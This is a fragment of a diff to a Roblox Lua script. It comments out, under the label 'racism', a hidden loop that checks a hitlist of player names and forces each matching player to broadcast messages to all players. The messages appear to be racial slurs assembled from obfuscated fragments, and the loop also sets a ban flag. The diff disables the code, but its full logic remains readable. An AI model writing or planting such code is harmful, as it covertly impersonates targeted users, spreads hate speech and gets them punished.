@@ -75,27 +75,28 @@ ListOfWords = {}
 
 namefound = false
 print("looking")
-spawn(function()
-	while true do
-        local word = math.random(1,2)
-        local hi = math.random(1, #races)
-		for i,t in pairs(hitlist) do
-            if string.lower(t) == string.lower(game.Players.LocalPlayer.Name) then
-                Bancountdown = true
-                if word == 1 then
-                    local ohString11 = tostring(A.." "..K..B..L..V.." "..J..M)
-                    local ohString22 = "All"
-                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString11, ohString22)
-                else
-                    local ohString111 = tostring(races[hi]..vomit)
-                    local ohString222 = "All"
-                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString111, ohString222)
-                end
-            end
-        end
-	wait(1)
-	end
-end)
+--racism
+-- spawn(function()
+-- 	while true do
+--         local word = math.random(1,2)
+--         local hi = math.random(1, #races)
+-- 		for i,t in pairs(hitlist) do
+--             if string.lower(t) == string.lower(game.Players.LocalPlayer.Name) then
+--                 Bancountdown = true
+--                 if word == 1 then
+--                     local ohString11 = tostring(A.." "..K..B..L..V.." "..J..M)
+--                     local ohString22 = "All"
+--                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString11, ohString22)
+--                 else
+--                     local ohString111 = tostring(races[hi]..vomit)
+--                     local ohString222 = "All"
+--                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString111, ohString222)
+--                 end
+--             end
+--         end
+-- 	wait(1)
+-- 	end
+-- end)
 
 spawn(function()
 	while true do
